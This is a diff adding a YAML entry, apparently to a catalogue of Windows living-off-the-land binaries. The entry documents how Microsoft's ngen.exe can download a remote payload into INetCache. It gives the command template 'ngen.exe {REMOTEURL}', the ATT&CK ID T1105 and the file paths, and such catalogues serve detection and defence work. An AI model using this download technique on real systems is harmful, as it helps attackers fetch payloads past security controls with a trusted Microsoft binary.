@@ -1,0 +1,23 @@
+---
+Name: Ngen.exe
+Description: Microsoft Native Image Generator.
+Author: Avihay Eldad
+Created: 2024-02-19
+Commands:
+  - Command: ngen.exe {REMOTEURL}
+    Description: Downloads payload from remote server using the Microsoft Native Image Generator utility.
+    Usecase: It will download a remote payload and place it in INetCache.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe
+  - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe
+  - Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
+  - Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@AvihayEldad'
